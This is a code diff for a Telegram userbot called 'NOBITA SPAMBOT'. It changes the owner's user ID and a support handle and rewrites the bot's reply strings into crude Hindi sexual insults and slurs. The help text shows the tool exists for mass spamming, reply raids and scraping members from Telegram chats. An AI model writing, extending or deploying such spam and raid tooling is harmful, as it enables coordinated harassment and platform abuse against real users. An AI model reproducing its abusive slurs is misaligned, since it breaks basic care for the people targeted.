@@ -61,7 +61,7 @@ ddk = ""
 
 que = {}
 
-SMEX_USERS = [1904312233]
+SMEX_USERS = [5185812245]
 for x in SUDO:
     SMEX_USERS.append(x)
 
@@ -356,7 +356,7 @@ async def _(e):
             event = await e.reply(text, parse_mode=None, link_preview=None)
             try:
                 await e.client(ImportChatInviteRequest(bc))
-                await event.edit("ℙℝ𝕀𝕍𝔸𝕋𝔼 ℝ𝔸ℕ𝔻𝕀 🤤")
+                await event.edit("𝗣𝗥𝗜𝗩𝗔𝗧𝗘 𝗠𝗔𝗜 𝗖𝗛𝗨𝗗𝗘𝗚𝗔 𝗔𝗔𝗝 🍌")
             except Exception as e:
                 await event.edit(str(e))
         else:
@@ -384,7 +384,7 @@ async def _(e):
             event = await e.reply(text, parse_mode=None, link_preview=None )
             try:
                 await event.client(LeaveChannelRequest(bc))
-                await event.edit("𝐂𝐇𝐀𝐋𝐎 𝐂𝐇𝐔𝐃 𝐆𝐀𝐘𝐀 𝐘𝐄 𝐊𝐈𝐃𝐙𝐙 𝐀𝐁 𝐂𝐇𝐀𝐋𝐎")
+                await event.edit("𝐂𝐇𝐀𝐋𝐎 𝐂𝐇𝐔𝐃 𝐆𝐀𝐘𝐀 𝐘𝐄 𝐊𝐈𝐃𝐙𝐙 👅")
             except Exception as e:
                 await event.edit(str(e))   
         else:
@@ -657,7 +657,7 @@ async def _(e):
             qeue = que.get(g)
             appendable = [g]
             qeue.append(appendable)
-            text = "𝔸𝔹 𝔹𝕆𝕃 𝔹𝕊𝔻𝕂 𝕂𝔼"
+            text = "𝗞𝗟𝗣 𝗚𝗔𝗬𝗔 𝗥𝗔𝗡𝗗𝗜🍌 𝗞𝗘 𝗣𝗜𝗟𝗟𝗘 "
             await e.reply(text, parse_mode=None, link_preview=None)
         else:
             await e.reply(usage, parse_mode=None, link_preview=None)
@@ -797,7 +797,7 @@ async def restart(e):
 @ddk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
 async def help(e):
     if e.sender_id in SMEX_USERS:
-        text = "[ 𝐍𝐎𝐁𝐈𝐓𝐀 𝐒𝐏𝐀𝐌𝐁𝐎𝐓 ]\n\n𝐒𝐓𝐀𝐑𝐓 𝐂𝐎𝐌𝐌𝐀𝐍𝐃:\n.ping\n.restart\n\n𝐉𝐎𝐈𝐍 𝐂𝐎𝐌𝐌𝐀𝐍𝐃:\n.join\n.pjoin\n.leave\n\n𝐒𝐏𝐀𝐌 𝐂𝐎𝐌𝐌𝐀𝐍𝐃:\n.spam\n.delayspam\n.bigspam\n.replyraid\n.dreplyraid\n\n𝐒𝐂𝐑𝐀𝐏 𝐂𝐎𝐌𝐌𝐀𝐍𝐃:\n.scrap\n\n𝐅𝐎𝐑 𝐍𝐄𝐄𝐃 𝐀𝐍𝐘 𝐇𝐄𝐋𝐏 𝐀𝐁𝐎𝐔𝐓 𝐒𝐏𝐀𝐌𝐁𝐎𝐓 𝐉𝐎𝐈𝐍 @NOBITA_SPAMBOTSUPPORT"
+        text = "[ 𝐍𝐎𝐁𝐈𝐓𝐀 𝐒𝐏𝐀𝐌𝐁𝐎𝐓 ]\n\n𝐒𝐓𝐀𝐑𝐓 𝐂𝐎𝐌𝐌𝐀𝐍𝐃:\n.ping\n.restart\n\n𝐉𝐎𝐈𝐍 𝐂𝐎𝐌𝐌𝐀𝐍𝐃:\n.join\n.pjoin\n.leave\n\n𝐒𝐏𝐀𝐌 𝐂𝐎𝐌𝐌𝐀𝐍𝐃:\n.spam\n.delayspam\n.bigspam\n.replyraid\n.dreplyraid\n\n𝐒𝐂𝐑𝐀𝐏 𝐂𝐎𝐌𝐌𝐀𝐍𝐃:\n.scrap\n\n𝐅𝐎𝐑 𝐍𝐄𝐄𝐃 𝐀𝐍𝐘 𝐇𝐄𝐋𝐏 𝐀𝐁𝐎𝐔𝐓 𝐒𝐏𝐀𝐌𝐁𝐎𝐓 𝐉𝐎𝐈𝐍 @OPSPAMMERKING"
         await e.reply(text, parse_mode=None, link_preview=None)
 
 
@@ -1018,7 +1018,7 @@ text = """ """
 print(text)
 print("")
 print(
-    "CONGRATULATIONS 🥳🥳..UR Spam Bots Ready to use"
+    "CONGRATULATIONS 🥳🥳..NOBITA Spam Bots Ready to Fuck"
 )
 if len(sys.argv) not in (1, 3, 4):
     try:
